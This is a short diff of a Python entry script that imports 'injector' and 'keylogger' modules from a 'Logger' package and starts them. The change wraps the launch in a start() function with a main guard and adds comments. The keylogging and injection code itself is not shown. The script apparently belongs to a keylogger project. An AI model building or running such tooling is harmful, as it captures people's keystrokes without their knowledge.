@@ -1,7 +1,10 @@
-from Logger import injector, keylogger
-import threading
+from Logger import injector, keylogger 
+import threading 
 
-injector_thread = threading.Thread(target=injector.start)
-injector_thread.start()
+def start():
+    injector_thread = threading.Thread(target=injector.start)  # Create a thread for the injector module's
+    injector_thread.start()  # Start the injector
+    keylogger.start()  # Start the Keylogger listener
 
-keylogger.start()
+if __name__ == '__main__':
+    start()
